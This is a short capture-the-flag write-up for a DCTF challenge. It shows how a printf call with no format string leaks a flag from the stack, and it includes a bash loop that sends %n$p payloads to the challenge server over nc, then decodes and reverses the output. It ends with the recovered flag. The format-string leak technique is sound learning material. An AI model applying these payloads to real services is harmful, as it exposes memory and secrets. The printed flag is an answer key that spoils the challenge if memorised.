## ***README***

The vuln function reads flag.txt into a local (local_58) stack array.

The vulnerability is the printf(local_38) statement that is missing a format string. Exfiltrating the flag is as simple as passing %nn$p format strings where nn is the position in the stack; starting from 6 just increment until the output starts with dctf (nn = 8), then continue until you have the flag.

```c
for((p=8;p<14;p++)) {
    echo '%'$p'$p' | \
    nc dctf-chall-readme.westeurope.azurecontainer.io 7481 | \
    grep 'hello ' | \
    awk -Fx '{print $NF}' | \
    xxd -r -p | \
    rev
}
```

This bash script will echo %8$p, then echo %9$p, etc... into the challenge service serially (one by one), capturing the output (grep, awk), converting to text (xxd), and then finally reversing the string (rev, since x86_64 is little endian).

```
dctf{n0w_g0_r3ad_s0me_b0rev: stdin: Invalid or incomplete multibyte or wide character
rev: stdin: Invalid or incomplete multibyte or wide character
rev: stdin: Invalid or incomplete multibyte or wide character
```
By guessing the last letters as `0k5`.

Flag : ***```dctf{n0w_g0_r3ad_s0me_b00k5}```***
